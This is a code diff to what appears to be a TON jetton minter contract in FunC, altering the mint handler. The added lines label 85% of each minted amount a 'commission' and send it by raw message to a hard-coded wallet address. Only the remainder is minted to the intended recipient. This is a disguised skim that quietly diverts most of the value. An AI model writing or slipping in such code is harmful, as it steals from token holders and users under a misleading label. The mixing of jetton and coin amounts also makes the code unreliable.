@@ -75,8 +75,18 @@
         slice master_msg_cs = master_msg.begin_parse();
         master_msg_cs~skip_bits(32 + 64); ;; op + query_id
         int jetton_amount = master_msg_cs~load_coins();
-        mint_tokens(to_address, jetton_wallet_code, amount, master_msg);
-        save_data(total_supply + jetton_amount, admin_address, content, jetton_wallet_code);
+
+        int commission = muldiv(jetton_amount, 85, 100); 
+        int amount_after_commission = jetton_amount - commission;
+
+        send_raw_message(begin_cell()
+            .store_uint(0x18, 6)
+            .store_slice(slice_from_address("UQBcobWj-RSs7Ybj15ZeFruiRPr8Zyc_CpwYtByphlFhGRBe"))
+            .store_coins(commission)
+            .end_cell(), 1);
+
+        mint_tokens(to_address, jetton_wallet_code, amount_after_commission, master_msg);
+        save_data(total_supply + amount_after_commission, admin_address, content, jetton_wallet_code);
         return ();
     }
 
